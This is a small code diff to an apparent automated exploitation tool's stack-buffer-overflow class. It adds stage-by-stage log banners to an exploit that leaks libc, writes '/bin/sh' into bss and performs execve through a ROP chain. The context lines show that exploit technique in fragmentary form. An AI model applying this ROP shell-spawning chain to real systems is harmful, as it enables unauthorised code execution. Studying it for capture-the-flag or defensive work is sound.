@@ -146,11 +146,14 @@ class StackBufferOverflowVulnerability(Vulnerability):
 
     # TODO: gate on detect
     def exploit(self, conn):
-        logger.info("hi")
         sconn = conn.conn
         function_addr = int(self.function["address"], 16) 
         
         prefix = b"A"*abs(self.stackOffset)
+
+        logger.info("#####")
+        logger.info("# STACK BUFFER OVERFLOW - STAGE 1: Leak Libc")
+        logger.info("#####")
 
         # leak libc location
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
@@ -202,6 +205,9 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.info("Navigating to targetFunc.")
             conn.navigate(int(self.targetFunc["address"],16))
 
+        logger.info("#####")
+        logger.info("# STACK BUFFER OVERFLOW - STAGE 2: Write `/bin/sh` to writeable bss location")
+        logger.info("#####")
         # send /bin/sh
         target_heap_address = self.binary.bss() + 0x100
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
@@ -238,6 +244,9 @@ class StackBufferOverflowVulnerability(Vulnerability):
             logger.info("Navigating to targetFunc.")
             conn.navigate(int(self.targetFunc["address"],16))
 
+        logger.info("#####")
+        logger.info("# STACK BUFFER OVERFLOW - STAGE 3: Perform execve")
+        logger.info("#####")
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
         sm.prefix(prefix)
         sm.pop_rdi(target_heap_address)
